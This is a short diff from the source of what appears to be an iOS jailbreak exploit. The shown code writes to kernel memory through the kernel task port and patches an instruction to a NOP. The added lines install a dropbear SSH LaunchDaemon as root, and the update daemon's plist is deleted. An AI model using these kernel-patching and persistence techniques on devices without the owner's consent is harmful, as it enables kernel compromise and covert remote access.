@@ -422,7 +422,6 @@ void exploit(void* btn, mach_port_t pt, uint64_t kernbase, uint64_t allprocs)
     
     vm_address_t kppsh = 0;
     mach_vm_allocate(tfp0, &kppsh, 0x4000, VM_FLAGS_ANYWHERE);
-
     {
         int n = 0;
         
@@ -613,7 +612,6 @@ RemapPage_(x+PSZ);\
         RemapPage(tfp + cbz*4);
         WriteAnywhere32(NewPointer(tfp+cbz*4), 0xd503201f);
     }
-    
     /*
      nonceenabler
      */
@@ -883,6 +881,14 @@ RemapPage_(x+PSZ);\
                 copyfile(jl, "/Library/LaunchDaemons/0.reload.plist", 0, COPYFILE_ALL);
                 chmod("/Library/LaunchDaemons/0.reload.plist", 0644);
                 chown("/Library/LaunchDaemons/0.reload.plist", 0, 0);
+            }
+            {
+                NSString* jlaunchctl = [execpath stringByAppendingPathComponent:@"dropbear.plist"];
+                char* jl = [jlaunchctl UTF8String];
+                unlink("/Library/LaunchDaemons/dropbear.plist");
+                copyfile(jl, "/Library/LaunchDaemons/dropbear.plist", 0, COPYFILE_ALL);
+                chmod("/Library/LaunchDaemons/dropbear.plist", 0644);
+                chown("/Library/LaunchDaemons/dropbear.plist", 0, 0);
             }
             unlink("/System/Library/LaunchDaemons/com.apple.mobile.softwareupdated.plist");
 
